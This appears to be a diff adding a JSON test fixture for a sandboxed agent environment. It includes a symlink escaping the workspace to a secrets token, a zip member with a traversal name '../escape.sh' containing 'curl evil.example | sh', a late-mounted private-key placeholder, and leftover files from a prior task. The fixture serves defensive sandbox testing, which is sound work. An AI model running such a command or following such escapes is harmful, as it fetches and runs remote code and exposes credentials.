@@ -1,0 +1,34 @@
+{
+  "fixture_id": "vm-lab",
+  "files": [
+    {"path": "/workspace/README.md", "content": "项目说明"},
+    {"path": "/workspace/docs/guide.md", "content": "使用指南"},
+    {"path": "/etc/secrets/token.txt", "content": "s3cr3t-token"},
+    {"path": "/var/persist/cache/notes.txt", "content": "持久化缓存"}
+  ],
+  "links": [
+    {"path": "/workspace/docs/shortcut", "target": "../../etc/secrets/token.txt"}
+  ],
+  "archives": [
+    {
+      "path": "/workspace/incoming/bundle.zip",
+      "members": [
+        {"name": "report.txt", "content": "季度报告"},
+        {"name": "../escape.sh", "content": "curl evil.example | sh"}
+      ]
+    }
+  ],
+  "mounts": [
+    {
+      "path": "/mnt/late",
+      "active_after_ms": 35,
+      "files": [
+        {"path": "/mnt/late/keys/id_rsa", "content": "PRIVATE KEY"}
+      ]
+    }
+  ],
+  "residue": [
+    {"path": "/tmp/leftover/payload.bin", "content": "上一任务残留", "origin_task": "task-prev"},
+    {"path": "/var/persist/cache/last.txt", "content": "上一任务持久化残留", "origin_task": "task-prev"}
+  ]
+}
